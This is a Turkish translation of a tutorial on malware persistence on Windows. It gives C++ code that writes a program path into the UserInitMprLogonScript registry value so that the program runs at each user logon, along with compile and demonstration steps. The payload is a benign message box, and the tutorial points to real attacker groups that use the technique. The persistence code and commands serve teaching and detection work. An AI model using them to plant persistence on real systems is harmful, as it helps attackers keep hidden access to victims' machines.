\newpage
\subsection{86. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 20. UserInitMprLogonScript (Oturum Açma Betiği). Basit C++ örneği.}

﷽

![pers](./images/82/2022-12-11_18-11.png){width="80%"}    

Bu gönderi, kötü amaçlı yazılımlarda kalıcılık sağlamak için kullanılabilecek en ilginç yöntemlerden biri olan **`UserInitMprLogonScript` değeri** ile kalıcılık sağlamaya dayanmaktadır.    

### UserInitMprLogonScript

Windows, bir kullanıcı veya bir grup kullanıcı sisteme oturum açtığında oturum açma betiklerinin çalıştırılmasını sağlar. `HKCU\Environment\UserInitMprLogonScript` Kayıt Defteri anahtarına bir betik yolunu eklemek bu işlemi gerçekleştirir. Bu yüzden, kalıcılık oluşturmak için siber saldırganlar, oturum açma sürücü başlatıldığında otomatik olarak çalıştırılan Windows oturum açma betiklerini kullanabilirler.      

### pratik örnek

Haydi pratik bir örneğe bakalım. Öncelikle, her zamanki gibi, "kötü" uygulamamızı oluşturalım. Basitlik açısından, yine `meow-meow` mesaj kutusu uygulamasını kullanıyoruz (`hack.cpp`):  

```cpp
/*
hack.cpp
windows kalıcılık için kötü uygulama
yazar: @cocomelonc
https://cocomelonc.github.io/malware/2022/12/09/malware-pers-20.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR 
lpCmdLine, int nCmdShow) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

Ardından, kalıcılık sağlayan betiği oluşturalım (`pers.cpp`):      

```cpp
/*
pers.cpp
UserInitMprLogonScript değerini ayarlayarak
Windows kalıcılığı

yazar: @cocomelonc
https://cocomelonc.github.io/malware/2022/12/09/malware-pers-20.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // ortam değişkeni
  const char* env = "Environment";

  // kötü amaçlı uygulama
  const char* exe = "Z:\\2022-12-09-malware-pers-20\\hack.exe";

  // ortam ayarları
  LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)env, 0 , KEY_WRITE, 
  &hkey);
  if (res == ERROR_SUCCESS) {
    // kayıt defteri anahtar değerini güncelle
    // reg add "HKEY_CURRENT_USER\Environment" /v "UserInitMprLogonScript" /t 
    // REG_SZ /d "...\\hack.exe" /f
    RegSetValueEx(hkey, (LPCSTR)"UserInitMprLogonScript", 0, REG_SZ, 
    (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  return 0;
}
```

Görebildiğiniz gibi, mantık oldukça basit. Sadece `HKCU\Environment` altındaki `UserInitMprLogonScript` anahtar değerini "kötü amaçlı yazılımımızın" tam yolu olan `Z:\\2022-12-09-malware-pers-20\\hack.exe` olarak ayarlıyoruz.     

### demo

Haydi her şeyi adım adım inceleyelim. Öncelikle, Kayıt Defteri'ni kontrol edelim:      

```powershell
reg query "HKCU\Environment" /s
```

![pers](./images/82/2022-12-11_17-57.png){width="80%"}    

Ardından, sıldırgan makinesinde (`kali`) "kötü amaçlı yazılımımızı" derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/82/2022-12-11_17-54.png){width="80%"}    

Ve doğruluğunu kontrol etmek için `hack.exe`'yi hedef makinede (örneğin benim durumumda `Windows 10 x64`) çalıştıralım:    

```powershell
.\hack.exe
```

![pers](./images/82/2022-12-11_18-00.png){width="80%"}    

Gördüğünüz gibi, "kötü amaçlı yazılımımız" sorunsuz çalışıyor.    

Sonraki adımda, sıldırgan makinesinde kalıcılık betiğini derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/82/2022-12-11_17-55.png){width="80%"}    

Ve betiği sıldırgan makinesinde çalıştıralım:    

```powershell
.\pers.exe
```

Ardından, Kayıt Defteri anahtar değerlerini tekrar kontrol edelim:    

```powershell
reg query "HKCU\Environment" /s
```

![pers](./images/82/2022-12-11_18-06.png){width="80%"}    

Gördüğünüz gibi, `UserInitMprLogonScript` anahtar değeri ayarlandı.    

Bu kadar. Şimdi oturumu kapatıp tekrar açalım:     

![pers](./images/82/2022-12-11_18-07.png){width="80%"}    

![pers](./images/82/2022-12-11_18-07_1.png){width="80%"}    

Ve birkaç milisaniye sonra "kötü amaçlı yazılımımız" (`meow-meow` mesaj kutusu) göründü:     

![pers](./images/82/2022-12-11_18-08.png){width="80%"}    

Ardından, Process Hacker'ı açıp `hack.exe` özelliklerini kontrol edelim:     

![pers](./images/82/2022-12-11_18-09.png){width="80%"}    

![pers](./images/82/2022-12-11_18-10.png){width="80%"}    

Ana sürecin "mevcut olmayan" bir süreç olduğunu görüyoruz.    

Eğer Windows iç mimarisini biraz incelediyseniz, bazı süreçlerin ebeveyn olarak "mevcut olmayan" süreçlere sahip olabileceğini bilirsiniz. Örneğin, Windows Explorer (`explorer.exe`). Ana süreci `userinit.exe` veya `winlogon.exe` olabilir, ancak `explorer.exe` kullanılarak başka herhangi bir `.exe` olabilir. `userinit.exe` kendisini sonlandırdığı için ana süreç "<Non-existent Process>" olarak görünür. Bir başka örnek Windows Oturum Açma (`winlogon.exe`). Ana süreci "mevcut değil" olarak görünür çünkü `smss.exe` kapanmıştır.    

Eğer `hack.exe` özelliklerini [Sysinternals Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) ile kontrol edersek, "Autostart Location" değerini görebiliriz:    

![pers](./images/82/2022-12-11_20-05.png){width="80%"}    

Her şey mükemmel çalıştı! =^..^=    

Deney sonunda, anahtarı silin:    

```powershell
Remove-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript"
```

![pers](./images/82/2022-12-19_18-00.png){width="80%"}    

Bu kalıcılık yöntemi, [APT28](https://attack.mitre.org/groups/G0007) grubu ve [Attor](https://attack.mitre.org/software/S0438) ile [Zebrocy](https://attack.mitre.org/software/S0438) gibi yazılımlar tarafından kullanılmıştır.    

Umarım bu gönderi, mavi takım üyelerinin bu teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah ekler.    

[Sysinternals Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)        
[Malware persistence: part 1](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)       
[APT28](https://attack.mitre.org/groups/G0007)      
[Attor](https://attack.mitre.org/software/S0438)        
[Zebrocy (Trojan)](https://attack.mitre.org/software/S0438)       
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-12-09-malware-pers-20)     
